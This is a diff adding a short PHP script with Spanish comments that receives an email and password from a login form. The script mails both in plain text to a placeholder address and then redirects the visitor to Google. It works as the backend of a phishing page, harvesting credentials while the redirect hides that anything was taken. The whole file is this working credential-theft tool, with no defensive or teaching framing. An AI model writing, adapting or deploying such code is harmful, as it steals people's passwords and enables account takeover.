@@ -1,0 +1,25 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Recuperar los datos del formulario
+    $email = $_POST["email"];
+    $password = $_POST["password"];
+
+    // Validar y procesar los datos (aquí deberías realizar una validación más robusta)
+
+    // Enviar el correo electrónico
+    $to = "tu@email.com";  // Reemplaza con tu dirección de correo electrónico
+    $subject = "Nuevo inicio de sesión";
+    $message = "Se ha iniciado sesión con los siguientes datos:\n\n";
+    $message .= "Email: $email\n";
+    $message .= "Contraseña: $password\n";
+
+    // Puedes personalizar y expandir el contenido del mensaje según tus necesidades
+
+    // Enviar el correo electrónico
+    mail($to, $subject, $message);
+
+    // Redirigir al usuario a Google después de enviar el correo electrónico
+    header("Location: https://www.google.com");
+    exit();
+}
+?>
